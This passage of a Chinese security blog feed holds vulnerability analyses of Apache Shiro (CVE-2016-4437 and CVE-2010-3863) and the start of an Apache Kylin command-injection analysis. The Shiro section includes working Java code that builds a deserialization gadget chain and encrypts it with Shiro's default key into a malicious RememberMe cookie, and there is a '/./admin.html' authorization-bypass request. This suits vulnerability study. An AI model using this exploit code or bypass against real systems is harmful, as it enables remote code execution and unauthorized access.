TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,templates);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(templates);</span><br><span class="line">        <span class="comment">// 通过反射修改iMethodName值为newTransformer</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>根据对应的<code>AbstractRememberMeManager#encrypt()</code>方法编写加密<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(path), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(String path) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后获得构造的恶意<code>RememberMe</code>字段内容，添加到 Cookie 中发送请求，成功弹出计算器。<br><img src="images/image-20221018164755328.png" alt="image-20221018164755328"></p><h2 id="Shiro-与-CC6"><a href="#Shiro-与-CC6" class="headerlink" title="Shiro 与 CC6"></a>Shiro 与 CC6</h2><p>在<code>Commons-Collections11</code>的时候曾提过<code>Commons-Collections6</code>这条链子在 shiro 中使用会报错，但如果你用<code>Commons-Collections6</code>生成的 POC 在我上面搭的环境会发现依然能正常弹出计算器，并没有出现报错，这是为什么呢？</p><p>在上述环境使用的依赖是<code>shiro-spring</code>，也就是用 Spring-boot 构建的 Shiro<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.4&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>Shiro 的原生依赖只用到了：<code>shiro-core</code>和<code>shiro-web</code>，那么<code>Spring</code>构建的<code>Shiro</code>和原生的<code>Shiro</code>有什么不同呢？</p><p>我们使用原生环境调调看，这里直接去 Shiro 的仓库下载，然后修改一下 pom.xml 文件即可，下面用到的环境也上传到前面提到的 github 仓库了。运行后访问主页，使用<code>CommonCollections6</code>的 POC 发送请求<br><img src="images/image-20221020003021727.png" alt="image-20221020003021727"></p><p>并没有弹出计算器，再回来看看 idea<br><img src="images/image-20221020003046360.png" alt="image-20221020003046360"></p><p>报错了，具体错误如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.</span><br></pre></td></tr></table></figure></p><p>翻译过来大体意思就是<code>Transformer</code>类找不到，我们跟一下反序列化的入口点看看<br><img src="images/image-20221020112505932.png" alt="image-20221020112505932"></p><p>这里可以看到最后用的是<code>ClassResolvingObjectInputStream</code>类返回输入流，而不是常规的<code>ObjectInputStream</code>类，跟进该类<br><img src="images/image-20221020112940956.png" alt="image-20221020112940956"></p><p>在<code>ClassResolvingObjectInputStream</code>类中继承了<code>ObjectInputStream</code>类并且重写了<code>resolveClass()</code>方法，跟进<code>ClassUtils.forName()方法</code><img src="images/image-20221020113104243.png" alt="image-20221020113104243"><br>又继续调用了<code>loadClass()</code>方法，其中参数值为<code>[Lorg.apache.commons.collections.Transformer;</code></p><p>这里的格式是<code>JNI</code>字段描述符，<code>[</code>表示数组，<code>L</code>代表类描述符，<code>;</code>表示类名到这里结束。</p><p>接着继续跟进<code>loadClass()</code>方法<br><img src="images/image-20221020113425888.png" alt="image-20221020113425888"></p><p>可以看到这里调用的<code>ClassLoader</code>为<code>ParallerWebappClassLoader</code>，接着到<code>loadClass()</code>方法，这里接着跟进需要添加 tomcat 的源码才能继续进行调试（这里是偷懒做法，如果想食用更佳，移步<a href="../../环境&amp;其他/Tomcat源码调试/Tomcat源码调试.md">Tomcat源码调试</a>）<br><img src="images/image-20221020113701346.png" alt="image-20221020113701346"></p><p>导入 tomcat 的 jar 包之后继续跟进<code>loadClass()</code>方法进入到了<code>WebappClassLoaderBase#loadClass()</code><br><img src="images/image-20221020113737475.png" alt="image-20221020113737475"></p><p>玩下走到<code>findLoadedClass0()</code>方法<br><img src="images/image-20221021234307342.png" alt="image-20221021234307342"></p><p><code>findLoadedClass0()</code>方法去缓存中查找是否存在，从跟的结果上得到是不存在，继续往下走到<code>this.findLoadedClass()</code>方法<br><img src="images/image-20221022160745842.png" alt="image-20221022160745842"></p><p>依然为null，后面的跟着几个方法都是为 null，我们略去，到最后一步关键处，也就是到了<code>Class.forName()</code>方法<br><img src="images/image-20221020113936096.png" alt="image-20221020113936096"></p><p>这里可以看到，此时的父加载器为<code>URLClassLoader</code><br><img src="images/image-20221020114136052.png" alt="image-20221020114136052"></p><p>其中<code>ucp</code>是<code>URLClassLoader</code>类的字段，<code>ucp</code>的成员<code>path</code>是一个 ArrayList 对象，存储着类的搜索路径。而这里这些路径全都是 tomcat 下的 lib 目录文件，并没有<code>commons-collections</code>的依赖文件。</p><p>下面贴上在<code>Class.forName()</code>方法后的 debug 过程视频（因为写成文字描述过于繁琐就贴上视频）</p><p><a href="https://user-images.githubusercontent.com/72428049/197333910-de821106-9403-4708-9f25-6604bff13485.mp4">https://user-images.githubusercontent.com/72428049/197333910-de821106-9403-4708-9f25-6604bff13485.mp4</a></p><p>在 debug 视频中可以看到，传进<code>Class.forName()</code>方法的参数 name 为<code>[Lorg.apache.commons.collections.Transformer;</code>，接着后面走到<code>findLoadedClass()</code>方法时还原成了正常的<code>org.apache.commons.collections.Transformer</code>，因此有些文章在跟到前面时就断定是先前的<code>[Lorgxxx</code>格式导致无法找到的结论并不准确，这并不是最终过程。</p><p>此外，可以看到<code>ClassLoader</code>的加载过程为<code>AppClassLoader</code> —&gt; <code>ExtClassLoader</code> —&gt; <code>BootstrapClassLoa·der</code>，均搜索不到<code>org.apache.commons.collections.Transformer</code>。</p><p>搜索不到后抛出<code>ClassNotFoundException</code>的异常<br><img src="images/image-20221020114557155.png" alt="image-20221020114557155"></p><p><img src="images/image-20221020114634262.png" alt="image-20221020114634262"></p><p>因此和之前的报错对应上了，那么为什么 spring 构建的 shiro 没有报错正常弹出计算器了呢？</p><p>我们继续调试一下<br><img src="images/image-20221020114824559.png" alt="image-20221020114824559"></p><p>在该环境中，加载的<code>ClassLoader</code>为<code>TomcatEmbeddedWebappClassLoader</code>，而不是之前 shiro 原生环境的<code>ParallerWebappClassLoader</code>。</p><p>继续跟进<code>loadClass()</code>方法，跳到了<code>TomcatEmbeddedWebappClassLoader#loadClass()</code>方法<br><img src="images/image-20221020115032790.png" alt="image-20221020115032790"></p><p>继续往下走，直到<code>Class.forName()</code>方法<br><img src="images/image-20221020115153447.png" alt="image-20221020115153447"></p><p>可以看到此时的父加载器为<code>AppClassLoader</code>系统类加载器，再看看此时的 path<br><img src="images/image-20221020115615209.png" alt="image-20221020115615209"></p><p>此时的 path 不再是 tomcat 下的，而是 java 环境中的，包含了<code>commons-collections</code>依赖，因此可以成功加载到<br><img src="images/image-20221020115831830.png" alt="image-20221020115831830"></p><p>这也解释了为什么在 spring 构建的 Shiro 环境中<code>Commons-Collections6</code>可以打成功，而原生的 Shiro 环境却报错失败的情况。</p><p>至于为什么 path 会不一样，父类加载器也不一样，尝试跟了一下，实在过于复杂，遂暂时放弃，调试到此。</p><p>等哪一天知识储备足够了，再来解惑。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在 Shiro 1.2.5 版本的更新中，用户需要手动配置 CipherKey，如果不设置，将会动态生成一个 CipherKey。但反序列化流程没有修改，这也是 Shiro 至今依然在各大 HW 演练中频繁出现的原因。</p>]]></content>
    
    
    <summary type="html">CVE-2016-4437漏洞分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2010-3863权限绕过分析</title>
    <link href="http://example.com/2022/11/10/CVE-2010-3863/"/>
    <id>http://example.com/2022/11/10/CVE-2010-3863/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:56:01.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2010-3863权限绕过分析"><a href="#CVE-2010-3863权限绕过分析" class="headerlink" title="CVE-2010-3863权限绕过分析"></a>CVE-2010-3863权限绕过分析</h1><h2 id="初识shiro"><a href="#初识shiro" class="headerlink" title="初识shiro"></a>初识shiro</h2><blockquote><p><strong>Apache Shiro™</strong>是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序——从最小的移动应用程序到最大的 Web 和企业应用程序。</p></blockquote><p>从官方简介中可以得知 shiro 是一套权限管理框架，在 shiro 框架中有以下三个核心概念模块：<code>Subject</code>、<code>SecurityManger</code>和<code>Realms</code><img src="images/image-20210418162523103.png" alt="image-20210418162523103"></p><ul><li><code>Subject</code>：当前正在执行的用户</li><li><code>SecurityManger</code>：安全管理器，管理所有用户的操作，是 shiro 架构的核心</li><li><code>Realm</code>：封装数据源，充当 shiro 与应用程序安全数据之间的桥梁，当需要与安全相关的数据(如用户帐户)进行实际交互以执行身份验证(登录)和授权(访问控制)时，为其提供身份验证或者授权。</li></ul><p>因此一次 请求—&gt; 认证 —&gt; 授权的流程为：</p><ol><li>web 应用程序获取当前的<code>Subject</code>并调用该<code>Subject</code>的校验方法；</li><li><code>Subject</code>传递校验到<code>SecurityManger</code>进行处理并进行判断；</li><li><code>SecurityManger</code>调用<code>Realm</code>获取配置信息，通过该配置信息判断当前的<code>Subject</code>所属角色是否能够进行操作。</li></ol><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>该漏洞环境已经上传到 github 仓库上：<a href="https://github.com/dota-st/vulnEnv">https://github.com/dota-st/vulnEnv</a><br><img src="images/image-20221017113541029.png" alt="image-20221017113541029"></p><p>首先在配置文件<code>realm.ini</code>中定义了用户账号密码以及对应角色权限<br><img src="images/image-20221017113620512.png" alt="image-20221017113620512"></p><p>ShiroConfig<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> IniRealm <span class="title function_">getIniRealm</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IniRealm</span>(<span class="string">&quot;classpath:realm.ini&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(Realm realm)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>(realm);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * anon：无需认证就可以访问</span></span><br><span class="line"><span class="comment">     * authc：必须认证才能访问</span></span><br><span class="line"><span class="comment">     * user：必须拥有记住我功能才能访问</span></span><br><span class="line"><span class="comment">     * perms：拥有某个资源的权限才能访问</span></span><br><span class="line"><span class="comment">     * role：拥有某个角色的权限才能访问</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">        bean.setLoginUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        LinkedHashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;/admin.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/user.html&quot;</span>, <span class="string">&quot;authc, roles[user]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">        bean.setFilterChainDefinitionMap(map);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>UserController<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/doLogin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doLoginPage</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username, <span class="meta">@RequestParam(&quot;password&quot;)</span> String password, <span class="meta">@RequestParam(name=&quot;rememberme&quot;, defaultValue=&quot;&quot;)</span> String rememberMe)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(ShiroUtil.login(username, password))&#123;</span><br><span class="line">            <span class="keyword">if</span>(ShiroUtil.hasRole(<span class="string">&quot;admin&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;redirect:/admin.html&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ShiroUtil.hasRole(<span class="string">&quot;user&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;redirect:/user.html&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/unauth.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value=&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">helloPage</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/login.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>影响版本：shiro &lt; 1.1.0</p><p>shiro 使用<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain()</code>方法获取和调用执行的<code>filter</code><br><img src="images/image-20221017161045663.png" alt="image-20221017161045663"></p><p>在上图中可以看到，通过<code>getPathWithinApplication()</code>方法获取到我们传入的请求路径<code>/./admin.html</code>，接着通过<code>filterChainManager.getChainNames()</code>方法取出我们的配置<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[/admin.html, /user.html, /**]</span><br></pre></td></tr></table></figure></p><p>我们这里跟进一下<code>getPathWithinApplication()</code>方法<br><img src="images/image-20221017161803921.png" alt="image-20221017161803921"></p><p>继续跟进<code>getPathWithinApplication()</code>方法<br><img src="images/image-20221017161912839.png" alt="image-20221017161912839"></p><p>在<code>getRequestUri()</code>方法中返回了<code>/./admin.html</code>，继续跟进<code>getRequestUri()</code>方法<br><img src="images/image-20221017162105007.png" alt="image-20221017162105007"></p><p>最后会 return 到<code>decodeAndCleanUriString()</code>方法，继续跟进该方法<br><img src="images/image-20221017162648547.png" alt="image-20221017162648547"></p><p>首先对 URL 进行 URL 解码，并对<code>;</code>进行截取，查了一下</p><blockquote><p><code>decodeAndCleanUriString()</code> 是 URL Decode 及针对 JBoss/Jetty 等中间件在 url 处添加 <code>;jsessionid</code> 之类的字符串的适配，对 <code>;</code> 进行了截取。</p></blockquote><p>接下来<code>getChain()</code>方法往下走进行<code>while</code>循环，通过<code>pathMatches()-&gt;pathMatcher.matches()</code>方法进行匹配<br><img src="images/image-20221017164449628.png" alt="image-20221017164449628"></p><p>通过前面对请求处理的跟踪，可以发现在匹配之前没有对传进来的<code>URL</code>进行标准化路径处理，如果构造一下请求路径就有可能绕过权限校验。</p><p>回顾一下，我们的配置如下所示，设置<code>admin.html</code>文件只有<code>amdin</code>用户角色才能访问，同时设置<code>/**</code>为<code>anon</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">    ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        bean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line">        bean.setLoginUrl(<span class="string">&quot;/login.html&quot;</span>);</span><br><span class="line">        LinkedHashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;/admin.html&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/user.html&quot;</span>, <span class="string">&quot;authc, roles[user]&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br><span class="line">        bean.setFilterChainDefinitionMap(map);</span><br><span class="line">        <span class="keyword">return</span> bean;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>访问<code>admin.html</code>，因为没有<code>admin</code>权限，校验失败故 302 跳转到了<code>login.html</code><br><img src="images/image-20221017114715110.png" alt="image-20221017114715110"></p><p>访问<code>/./admin.html</code>或者<code>/aa/../admin.html</code>，在<code>while</code>循环中，与前面的<code>/admin.html</code>和<code>/user.html</code>匹配失败，进而进入了<code>/**</code>的匹配范围，成功访问到<code>admin.html</code>文件<br><img src="images/image-20221017114807826.png" alt="image-20221017114807826"></p>]]></content>
    
    
    <summary type="html">CVE-2010-3863权限绕过分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE-2021-45456 Apache Kylin 命令注入</title>
    <link href="http://example.com/2022/11/10/CVE-2021-45456ApacheKylin%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E8%A1%A5%E5%85%85/"/>
    <id>http://example.com/2022/11/10/CVE-2021-45456ApacheKylin%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E8%A1%A5%E5%85%85/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:57:44.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-45456-Apache-Kylin-命令注入"><a href="#CVE-2021-45456-Apache-Kylin-命令注入" class="headerlink" title="CVE-2021-45456 Apache Kylin 命令注入"></a>CVE-2021-45456 Apache Kylin 命令注入</h1><blockquote><p>看着y4er师傅写的分析，第一次看有点懵逼，所以简单的补充一下。</p></blockquote><h2 id="补充分析"><a href="#补充分析" class="headerlink" title="补充分析"></a>补充分析</h2><p>首先漏洞点在该路由的 <strong>dumpProjectDiagnosisInfo</strong>方法中project可控。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534592-9f600b83-9036-45f3-a9a9-c7bc2bae5e48.png" alt="image-20220114222208845"></p><p>跟着进去，可以看到<strong>runDiagnosisCLI</strong>方法之后正常执行命令并且project一直可控。所以非常有机会RCE了!</p><p><img src="https://user-images.githubusercontent.com/63966847/149534609-f5d94546-4965-4580-8d1f-bfcb054127c3.png" alt="image-20220114222316611"></p><p>唯一绕过就是不让 <strong>projectInstance</strong>为null，不然就throw抛异常。所以我们看看projectInstance得到如何获得。</p><p>首先通过 <strong>convertStringToBeAlphanumericUnderscore</strong>方法进行替换，输入 <strong>touch 123</strong>则替换之后就为 <strong>touch123</strong></p><p><img src="https://user-images.githubusercontent.com/63966847/149534631-abb945b7-2bce-4fbe-baa3-e7032f013124.png" alt="image-20220114222541519"></p><p>之后通过 <strong>getProject</strong>方法去找有没有 <strong>touch123</strong>这个项目。看下面是通过<strong>projectMap.get(projectName);</strong>去获得如果有就不会抛异常就成功命令执行。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534653-e78ad090-416d-4ce6-ae15-1fed7012cbea.png" alt="image-20220114222809923"></p><p>所以我们在看看得到才什么类中获取，也就是去看 <strong>projectMap</strong>是指的那个类。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534679-31cc4590-a299-4882-9bee-b8fd9789b776.png" alt="image-20220114222920990"></p><p>然后跟上ProjectInstance，则到了如下代码，可以看到setname进去，所以我们最开始需要setname进去和 <strong>touch123</strong>相同就可以了</p><p><img src="https://user-images.githubusercontent.com/63966847/149534692-aacfd561-fcc5-42ae-94c0-84c342f026be.png" alt="image-20220114223024834"></p><p>向上跟踪</p><p><img src="https://user-images.githubusercontent.com/63966847/149534717-bb589da3-01f3-4f5b-a81b-b62e23419bc9.png" alt="image-20220114223153636"></p><p>然后去跟踪 <strong>createProject</strong>方法，之后到了 <strong>saveProject</strong>方法</p><p><img 